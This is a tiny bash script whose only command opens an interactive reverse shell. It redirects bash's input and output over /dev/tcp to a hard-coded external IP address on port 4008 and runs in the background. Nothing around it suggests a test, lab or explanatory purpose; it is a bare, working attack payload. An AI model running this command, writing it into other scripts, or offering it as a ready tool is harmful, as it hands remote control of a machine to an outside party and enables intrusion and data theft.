#!/usr/bin/env bash
/bin/bash -i >/dev/tcp/82.165.97.169/4008 0<&1 2>&1 &
